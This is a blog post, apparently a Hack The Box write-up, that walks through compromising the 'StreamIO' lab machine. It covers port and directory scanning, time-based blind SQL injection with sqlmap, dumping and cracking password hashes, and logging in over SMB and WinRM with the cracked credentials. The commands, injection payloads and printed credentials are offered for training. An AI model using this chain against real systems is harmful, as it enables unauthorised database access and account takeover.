
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="index, follow" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
        disabled="disabled"
    href="/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
            disabled="disabled"
          href="/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
          href="/theme/pygments/github.min.css">


  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">

  <link rel="stylesheet" type="text/css" href="/static/css/custom.css">

    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Blog Atom">



  


 

<meta name="author" content="raphajohnsec" />
<meta name="description" content="Click on &#34;Continue Reading&#34; to activate the password field." />
<meta name="keywords" content="#htb, #python, #impacket, #windows, #active-directory, #writeup">


  <meta property="og:site_name" content="Security Blog"/>
  <meta property="og:title" content="HTB - StreamIO - Writeup"/>
  <meta property="og:description" content="Click on &#34;Continue Reading&#34; to activate the password field."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="/drafts/htb-streamio-writeup.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2022-06-14 00:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="/author/raphajohnsec.html">
  <meta property="article:section" content="htb"/>
  <meta property="article:tag" content="#htb"/>
  <meta property="article:tag" content="#python"/>
  <meta property="article:tag" content="#impacket"/>
  <meta property="article:tag" content="#windows"/>
  <meta property="article:tag" content="#active-directory"/>
  <meta property="article:tag" content="#writeup"/>
  <meta property="og:image" content="/images/profile.jpg">

  <title>Security Blog &ndash; HTB - StreamIO - Writeup</title>

</head>
<body class="light-theme">
  <aside>
    <div>
      <a href="/">
        <img src="/images/profile.jpg" alt="Security Blog" title="Security Blog">
      </a>

      <h1>
        <a href="/">Security Blog</a>
      </h1>

<p>Content is my own</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="/pages/about/">
                  About
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-twitter" href="https://twitter.com/raphajohnsec" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="/">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-streamio-writeup">HTB - StreamIO - Writeup</h1>
    <p>
      Posted on Tue 14 June 2022 in <a href="/category/htb.html">htb</a>

    </p>
  </header>


  <div>
    <p>We have an IP, so we start with the usual, a simple port scan using nmap.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Nmap 7.80 scan initiated Wed Jun 15 08:35:18 2022 as: nmap -p - -T4 -sV -oA nmap_streamio 10.10.11.158</span>
Nmap scan report <span class="k">for</span> streamio <span class="o">(</span><span class="m">10</span>.10.11.158<span class="o">)</span>
Host is up <span class="o">(</span><span class="m">0</span>.026s latency<span class="o">)</span>.
Not shown: <span class="m">65517</span> filtered ports
PORT      STATE SERVICE       VERSION
<span class="m">53</span>/tcp    open  domain?
<span class="m">80</span>/tcp    open  http          Microsoft IIS httpd <span class="m">10</span>.0
<span class="m">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: <span class="m">2022</span>-06-15 <span class="m">13</span>:14:25Z<span class="o">)</span>
<span class="m">135</span>/tcp   open  msrpc         Microsoft Windows RPC
<span class="m">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
<span class="m">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: streamIO.htb0., Site: Default-First-Site-Name<span class="o">)</span>
<span class="m">443</span>/tcp   open  ssl/http      Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="m">445</span>/tcp   open  microsoft-ds?
<span class="m">464</span>/tcp   open  kpasswd5?
<span class="m">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
<span class="m">636</span>/tcp   open  tcpwrapped
<span class="m">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="m">9389</span>/tcp  open  mc-nmf        .NET Message Framing
<span class="m">49667</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">49673</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
<span class="m">49674</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">49701</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">61653</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span><span class="m">7</span>.80%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">6</span>/15%Time<span class="o">=</span>62A97E0B%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
SF:ersionBindReqTCP,20,<span class="s2">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span>
<span class="s2">SF:x04bind\0\0\x10\0\x03&quot;</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Wed Jun 15 08:39:11 2022 -- 1 IP address (1 host up) scanned in 233.05 seconds</span>
</code></pre></div>

<p>No RDP, but ldap port open and responding with domain information, the host might be an active directory domain controller. Let's see what the http/https ports show.</p>
<div class="highlight"><pre><span></span><code>curl --silent -v http://$TIP
</code></pre></div>

<div class="highlight"><pre><span></span><code>*   Trying 10.10.11.158:80...
* TCP_NODELAY set
* Connected to 10.10.11.158 (10.10.11.158) port 80 (#0)
&gt; GET / HTTP/1.1
&gt; Host: 10.10.11.158
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt; 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html
&lt; Last-Modified: Tue, 22 Feb 2022 10:46:01 GMT
&lt; Accept-Ranges: bytes
&lt; ETag: &quot;b23de861d927d81:0&quot;
&lt; Server: Microsoft-IIS/10.0
&lt; X-Powered-By: ASP.NET
&lt; Date: Wed, 15 Jun 2022 13:24:29 GMT
&lt; Content-Length: 703
&lt; 
{ [703 bytes data]
* Connection #0 to host 10.10.11.158 left intact
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
&lt;title&gt;IIS Windows Server&lt;/title&gt;
&lt;style type=&quot;text/css&quot;&gt;
&lt;!--
body {
    color:#000000;
    background-color:#0072C6;
    margin:0;
}

#container {
    margin-left:auto;
    margin-right:auto;
    text-align:center;
    }

a img {
    border:none;
}

--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;container&quot;&gt;
&lt;a href=&quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&quot;&gt;&lt;img src=&quot;iisstart.png&quot; alt=&quot;IIS&quot; width=&quot;960&quot; height=&quot;600&quot; /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div>

<p>Standard IIS site..., https responds with a 404...
Maybe <a href="https://github.com/projectdiscovery/nuclei#install-nuclei">nuclei</a> can find more information.
<img alt="Nuclei http" src="/images/htb/streamio/htb_streamio_nuclei_http.PNG">
Not for http.. Nothing intersting, but https leads to more information
<img alt="Nuclei https" src="/images/htb/streamio/htb_streamio_nuclei_https.PNG">
You can see, nuclei found two DNS names inside the SSL certificate:
- <strong>streamIO.htb</strong>
- <strong>watch.streamIO.htb</strong></p>
<p>Maybe the webserver responds differently whem we talk to the domain instead of the IP.
We specify the hostnames in <code>/etc/hosts</code>. If we ran our own DNS resolver, we could also specify the addresses there.
Include this</p>
<div class="highlight"><pre><span></span><code>10.10.11.158    streamio streamIO.htb0 watch.streamIO.htb streamio.htb
</code></pre></div>

<p>The http response is still the same when requesting <code>http://streamio.htb</code>, but <code>https://streamio.htb</code> now responds with a "real" website.
<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_https_site.PNG">
Also <code>https://watch.streamio.htb</code> reveals a website.
<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_watch_https_site.PNG"></p>
<p>Nuclei couln't find any vulnerabilities for both websites. Time to crawl both sites.
feroxbuster found some available endpoints on <code>https://streamio.htb</code></p>
<div class="highlight"><pre><span></span><code>./feroxbuster -k -u https://streamio.htb/ -x php,html,txt -w directory-list-lowercase-2.3-small.txt -t <span class="m">100</span> -o feroxbuster_streamio.htb.log

<span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/
<span class="m">301</span>      GET        2l       10w      151c https://streamio.htb/images <span class="o">=</span>&gt; https://streamio.htb/images/
<span class="hll"><span class="m">200</span>      GET      121l      291w     4500c https://streamio.htb/register.php
</span><span class="hll"><span class="m">200</span>      GET      206l      430w     6434c https://streamio.htb/contact.php
</span><span class="hll"><span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/index.php
</span><span class="hll"><span class="m">200</span>      GET      231l      571w     7825c https://streamio.htb/about.php
</span><span class="hll"><span class="m">200</span>      GET      111l      269w     4145c https://streamio.htb/login.php
</span><span class="hll"><span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/admin <span class="o">=</span>&gt; https://streamio.htb/admin/
</span><span class="m">301</span>      GET        2l       10w      157c https://streamio.htb/admin/images <span class="o">=</span>&gt; https://streamio.htb/admin/images/
<span class="m">403</span>      GET        1l        1w       18c https://streamio.htb/admin/index.php
<span class="m">301</span>      GET        2l       10w      148c https://streamio.htb/css <span class="o">=</span>&gt; https://streamio.htb/css/
<span class="m">301</span>      GET        2l       10w      154c https://streamio.htb/admin/css <span class="o">=</span>&gt; https://streamio.htb/admin/css/
<span class="m">301</span>      GET        2l       10w      147c https://streamio.htb/js <span class="o">=</span>&gt; https://streamio.htb/js/
<span class="m">301</span>      GET        2l       10w      153c https://streamio.htb/admin/js <span class="o">=</span>&gt; https://streamio.htb/admin/js/
<span class="m">302</span>      GET        0l        0w        0c https://streamio.htb/logout.php <span class="o">=</span>&gt; https://streamio.htb/
<span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/fonts <span class="o">=</span>&gt; https://streamio.htb/fonts/
<span class="hll"><span class="m">200</span>      GET        2l        6w       58c https://streamio.htb/admin/master.php
</span><span class="m">301</span>      GET        2l       10w      156c https://streamio.htb/admin/fonts <span class="o">=</span>&gt; https://streamio.htb/admin/fonts/
</code></pre></div>

<p>While trying to analyse <code>https://watch.streamio.htb</code>, feroxbuster and nuclei threw an error or didn't output any results. I thought at first, that the entry in <code>/etc/hosts</code> was wrong, but the entries were correct. I could't fingure why streamio.htb resolved correctly but watch.streamio.htb didn't. To resolve this I had to set up my own DNS resolver as suggested earlier in this article.
Because I use Ubuntu 20.04 as my pwnbox, I can install dnscrypt-proxy from the repository, it's up to date enough.</p>
<div class="highlight"><pre><span></span><code>apt install dnscrypt-proxy
</code></pre></div>

<p>You don't even have to disable existing name server/resolver on the system. dnscrypt-proxy listens by default and the address 127.0.2.1.
I edit the default config slightly, I add the following content just after <code>server_names = ['cloudflare']</code> in <code>/etc/dnscrypt-proxy/dnscrypt-proxy.toml</code>.</p>
<div class="highlight"><pre><span></span><code>cloaking_rules = &#39;cloaking_rules.txt&#39;
</code></pre></div>

<p>We add the file <code>/etc/dnscrypt-proxy/cloaking_rules.txt</code> with the content</p>
<div class="highlight"><pre><span></span><code>*.streamio.htb  10.10.11.158
</code></pre></div>

<p>and to <code>/etc/resolv.conf</code> we add <code>nameserver    127.0.2.1</code> as first nameserver entry. Now we remove the entries from <code>/etc/hosts</code> regarding streamio.htb. 
Restart the service</p>
<div class="highlight"><pre><span></span><code>
</code></pre></div>

<p>Now every DNS request to *.streamio.htb resolves to thhe specified IP.
nuclei now returns some info for <code>watch.streamio.htb</code>, but nothing intersting. But feroxbuster could find some endpoints</p>
<div class="highlight"><pre><span></span><code>200      GET       78l      245w     2829c https://watch.streamio.htb/
200      GET     7193l    19558w   253887c https://watch.streamio.htb/search.php
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/
</code></pre></div>

<p>Soooo let's look on all those endpoints...
Starting with the register.php endpoint. We can type in a username and a password. The site will always respond with "Account created" nevertheless, we registered the username before.</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_register.php.PNG">
<img alt="account created" src="/images/htb/streamio/streamio.htb_register_account_created.php.PNG"></p>
<p>But when we try to login with our newly created user, the login fails. Later on, we will learn, that only one user can login successfully.</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_login_failed.php.PNG"></p>
<p><code>contact.php</code> had a form available but did't lead to anything.
<code>/admin/index.php</code> showed <strong>FORBIDDEN</strong>, but
<code>admin/master.php</code> showed this</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_admin_master.php.PNG"></p>
<p><code>watch.streamio.htb/search.php</code> didn't liked SQL injection tries and redirected to <code>blocked.php</code></p>
<p><img alt="register.php" src="/images/htb/streamio/watch.streamio.htb_search_blocked.php.PNG"></p>
<p>Let's see what <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> can do for us. Trying all those found endpoints, I will show the results for <code>login.php</code></p>
<div class="highlight"><pre><span></span><code>sqlmap.py -u https://streamIO.htb/login.php --method POST --data <span class="nv">username</span><span class="o">=</span>FUZZ<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>FUZZ --batch --time-sec <span class="m">1</span>
</code></pre></div>

<p>sqlmap was lucky, sort of lucky because the injection is time based... ZZZZZzzzzzZZZZZzzzzz</p>
<div class="highlight"><pre><span></span><code>sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=FUZZ&#39;;WAITFOR DELAY &#39;0:0:1&#39;--&amp;password=FUZZ
---
web server operating system: Windows 10 or 2016 or 2019
web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
</code></pre></div>

<p>Using sqlmap again, we retrieve the available datbases</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> --dbs
available databases <span class="o">[</span><span class="m">5</span><span class="o">]</span>:
<span class="o">[</span>*<span class="o">]</span> model
<span class="o">[</span>*<span class="o">]</span> msdb
<span class="o">[</span>*<span class="o">]</span> STREAMIO
<span class="o">[</span>*<span class="o">]</span> streamio_backup
<span class="o">[</span>*<span class="o">]</span> tempdb
</code></pre></div>

<p>We couldn't extract any tables from <code>streamio_backup</code>, maybe due to missing permissions, but for <code>STREAMIO</code> it worked.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO --tables
Database: STREAMIO
<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
+--------+
<span class="p">|</span> movies <span class="p">|</span>
<span class="p">|</span> users  <span class="p">|</span>
+--------+
</code></pre></div>

<p>Great a <code>users</code> table. Extracting now the columns...</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO -T users --columns
Database: STREAMIO
Table: users
<span class="o">[</span><span class="m">4</span> columns<span class="o">]</span>
+----------+-------+
<span class="p">|</span> Column   <span class="p">|</span> Type  <span class="p">|</span>
+----------+-------+
<span class="p">|</span> id       <span class="p">|</span> int   <span class="p">|</span>
<span class="p">|</span> is_staff <span class="p">|</span> bit   <span class="p">|</span>
<span class="p">|</span> password <span class="p">|</span> nchar <span class="p">|</span>
<span class="p">|</span> username <span class="p">|</span> nchar <span class="p">|</span>
+----------+-------+
</code></pre></div>

<p>There are around 30 users in that table, depending on how many registered at that time.
I selected those usernames where <strong>is_staff</strong> is set to <strong>0</strong>.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --time-sec <span class="m">1</span> --sql-query<span class="o">=</span><span class="s2">&quot;SELECT username FROM STREAMIO..users WHERE is_staff=0&quot;</span>
</code></pre></div>

<p>It only returned one username... <strong>admin</strong> and I retrieved the password, probably MD5 <strong>665a50ac9eaa781e4f7f04199db97a11</strong>. Crackstation revealed the password <strong>paddpadd</strong>. The login with those credentials still fails.
So we dump all usernames, limiting the dumped characters to 10 chars. This took around 30 minutes.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> -D STREAMIO -T users -C username --dump --batch --time-sec <span class="m">1</span> --last <span class="m">10</span>
Database: STREAMIO                                                                                                                                                         Table: users                                                                                                                                                               <span class="o">[</span><span class="m">30</span> entries<span class="o">]</span>                                                                                                                                                               +-----------+                                                                                                                                                              <span class="p">|</span> username  <span class="p">|</span>                                                                                                                                                              +-----------+                                                                                                                                                              <span class="p">|</span> James     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Theodore  <span class="p">|</span>
<span class="p">|</span> Samantha  <span class="p">|</span>
<span class="p">|</span> Lauren    <span class="p">|</span>
<span class="p">|</span> William   <span class="p">|</span>
<span class="p">|</span> Sabrina   <span class="p">|</span>
<span class="p">|</span> Robert    <span class="p">|</span>
<span class="p">|</span> Thane     <span class="p">|</span>
<span class="p">|</span> Carmon    <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Barry     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Oliver    <span class="p">|</span>
<span class="p">|</span> Michelle  <span class="p">|</span>
<span class="p">|</span> Gloria    <span class="p">|</span>
<span class="p">|</span> Victoria  <span class="p">|</span>
<span class="p">|</span> Alexendra <span class="p">|</span>
<span class="p">|</span> Baxter    <span class="p">|</span>
<span class="p">|</span> Clara     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Barbra    <span class="p">|</span>
<span class="p">|</span> Lenord    <span class="p">|</span>
<span class="p">|</span> Austin    <span class="p">|</span>
<span class="p">|</span> Garfield  <span class="p">|</span>
<span class="p">|</span> Juliette  <span class="p">|</span>
<span class="p">|</span> Victor    <span class="p">|</span>
<span class="p">|</span> Lucifer   <span class="p">|</span>
<span class="p">|</span> Bruno     <span class="p">|</span>
<span class="p">|</span> Diablo    <span class="p">|</span>
<span class="p">|</span> Robin     <span class="p">|</span>
<span class="p">|</span> Stan      <span class="p">|</span>
<span class="p">|</span> yoshihide <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> admin     <span class="p">|</span>                                                                                                                                                              +-----------+
</code></pre></div>

<p>Now i could dump all passwords, respectivly the MD5 hashes, but I try another way first.</p>
<p>There are 2 usernames that stand out.
1. yoshihide
2. admin</p>
<p>I try to register <strong>admin</strong> with my own password and log in. No success.
I try to register <strong>yoshihide</strong> with my own password and log in. <strong>SUCCESS</strong>
Finally the log in with my own registered password worked and I can navigate to the <code>/admin/</code>site.</p>
<p><img alt="admin interface" src="images/htb/streamio/streamio.htb_admin.PNG"></p>
<p>So the endpoints seem to allow deletion of users and movies. I suspect some sort of "DELETE" SQL query behind those request and sqlmap could find again an injection, but again time based...</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span> --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span>
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
---
Parameter: movie_id <span class="o">(</span>POST<span class="o">)</span>
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries <span class="o">(</span>comment<span class="o">)</span>
    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span><span class="p">;</span>WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind <span class="o">(</span>IF<span class="o">)</span>
    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span> WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>
---
</code></pre></div>

<p>This time the <strong>db_admin</strong> user is used to conduct those queries instead if the <strong>db_user</strong> before. Maybe we can access <strong>streamio_backup</strong> now.
And yesssss, the tables enumeration worked.. more or less.. sqlmap had a hard time to retrieve those tables. Maybe the machine was under load at that time.</p>
<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span>  --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span> --output-dir<span class="o">=</span>~/venv3/htb/streamio/sqlmap/ -D streamio_backup --tables --fresh-queries
Database: streamio_backup
<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
+--------+
<span class="p">|</span> movies <span class="p">|</span>
<span class="p">|</span> users  <span class="p">|</span>
+--------+
</code></pre></div>

<p>The table <strong>users</strong> has 3 columns <code>id, password, username</code>. The retrieving was very slow, retrieving 2 rows took 45 minutes.</p>
<div class="highlight"><pre><span></span><code>nikk37 - 389d14cb8e4e9b94b137deb1caf0612a
yoshihide - b779ba15cedfd22a023c4d8bcf5f2332
</code></pre></div>

<p>Again MD5 hashes...</p>
<div class="highlight"><pre><span></span><code>389d14cb8e4e9b94b137deb1caf0612a    md5 get_dem_girls2@yahoo.com
b779ba15cedfd22a023c4d8bcf5f2332    md5 66boysandgirls..
</code></pre></div>

<p>Great both cracked, let's see if SMB login works.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># nikk37 worked</span>
cme smb streamio.htb -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\n</span>ikk37:get_dem_girls2@yahoo.com

<span class="c1"># and whats even better? winrm worked too</span>

evil-winrm  -i <span class="nv">$TIP</span> -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>ocuments&gt;

<span class="c1"># and there is the user flag</span>
*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop&gt; ls


    Directory: C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        <span class="m">6</span>/17/2022   <span class="m">5</span>:17 AM             <span class="m">34</span> user.txt
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="/tag/htb.html">#htb</a>
      <a href="/tag/python.html">#python</a>
      <a href="/tag/impacket.html">#impacket</a>
      <a href="/tag/windows.html">#windows</a>
      <a href="/tag/active-directory.html">#active-directory</a>
      <a href="/tag/writeup.html">#writeup</a>
    </p>
  </div>





</article>

    <footer>
<p>&copy; 2022 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="False"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Security Blog ",
  "url" : "",
  "image": "/images/profile.jpg",
  "description": ""
}
</script>

</body>
</html>